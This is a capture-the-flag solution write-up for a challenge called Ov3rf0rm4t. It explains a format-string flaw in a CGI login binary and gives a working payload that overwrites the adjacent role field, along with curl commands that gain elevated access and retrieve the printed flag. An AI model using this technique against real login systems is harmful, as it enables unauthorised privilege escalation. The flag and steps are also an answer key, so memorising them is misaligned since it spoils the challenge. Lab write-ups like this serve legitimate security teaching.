# PoC — Challenge 07: Ov3rf0rm4t

**Flag:** `EPI{7H475_50M3_r34LLy_84D_C91}`
**Vulnerability:** Format string via `sprintf()` — overflow adjacent `role` field in CGI binary
**Binary:** `/var/www/internal/data/cgi-login` (32-bit, CGI on internal.ecorp.epi)
**Access needed:** SSH as `junior-dev` (tunnel to localhost:80)

---

## Vulnerability

The CGI binary has a local struct:

```c
struct {
    char username[32];
    char role[64];
} locals = { .role = "guest" };

// PHP pipes user input to cgi-login and reads its stdout
sprintf(locals.username, buffer);  // FORMAT STRING: no format arg, user controls format
```

`sprintf(locals.username, buffer)` uses `buffer` as a format string. Since `username[32]` and `role[64]` are adjacent in the struct, output that overflows `username` writes into `role`.

**Attack:**
- Send `%32cintrauser` as the format string
- `%32c` outputs one character padded to 32 bytes (fills `username[32]`)
- `intrauser` immediately follows and overflows into `role[64]`
- Result: `role` is now `"intrauser"` → PHP grants session as "intrauser"

**Double encoding:** PHP URL-decodes the POST body, so to get the literal `%32c` into the CGI:
- POST `username=%2532cintrauser` → PHP decodes `%25` → `%` → CGI receives `%32cintrauser`

---

## Exploit

```bash
# From within the junior-dev SSH session (curl reaches localhost:80 with Host header):

# Step 1: Login — sends %32cintrauser as format string to cgi-login via PHP
curl -s \
  -H "Host: internal.ecorp.epi" \
  -X POST \
  --data-urlencode 'username=%2532cintrauser' \
  http://localhost/ \
  -c /tmp/intra_jar.txt \
  -L -D /tmp/intra_headers.txt \
  -o /tmp/intra_resp.html

# Check we got a session
grep -i 'PHPSESSID\|302' /tmp/intra_headers.txt

# Step 2: Access dashboard — flag is in an HTML comment
curl -s \
  -H "Host: internal.ecorp.epi" \
  -b /tmp/intra_jar.txt \
  http://localhost/dashboard.php \
  | grep -i 'EPI\|comment\|flag'
```

**Or via script:** `scripts/exploit_ovr3f0rm4t.py <SSH_PORT>`

**Flag:** `EPI{7H475_50M3_r34LLy_84D_C91}`  
*(found in an HTML comment: `<!-- Reminder to improve the cgi code EPI{...} -->`)*
